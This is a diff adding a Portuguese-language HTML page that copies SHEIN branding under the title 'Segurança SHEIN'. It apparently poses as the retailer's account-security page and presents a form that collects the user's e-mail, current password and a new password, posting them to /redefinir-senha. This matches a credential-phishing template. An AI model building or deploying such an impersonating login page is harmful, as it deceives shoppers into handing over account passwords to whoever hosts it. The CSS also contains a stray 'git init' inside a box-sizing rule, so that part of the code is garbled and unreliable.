@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login - Segurança SHEIN</title>
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing:git init border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-box {
+      background: white;
+      width: 360px;
+      padding: 40px;
+      border-radius: 10px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+    }
+
+    .logo {
+      text-align: center;
+      font-size: 32px;
+      font-weight: bold;
+      margin-bottom: 30px;
+      letter-spacing: 2px;
+    }
+
+    .input-group {
+      margin-bottom: 20px;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 14px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 15px;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      background: black;
+      color: white;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    .login-btn:hover {
+      background: #333;
+    }
+
+    .links {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 14px;
+    }
+
+    .links a {
+      color: black;
+      text-decoration: none;
+      margin: 0 5px;
+    }
+
+    .links a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-box">
+    <div class="logo">SHEIN</div>
+
+    <form action="/redefinir-senha" method="POST">
+  <div class="input-group">
+    <input type="email" name="email" placeholder="E-mail" required />
+  </div>
+
+  <div class="input-group">
+    <input type="password" name="senhaAtual" placeholder="Senha Atual" required />
+  </div>
+
+  <div class="input-group">
+    <input type="password" name="novaSenha" placeholder="Nova Senha" required />
+  </div>
+
+  <button type="submit" class="login-btn">Redefinir</button>
+</form>
+
+  </div>
+
+</body>
+</html>
+
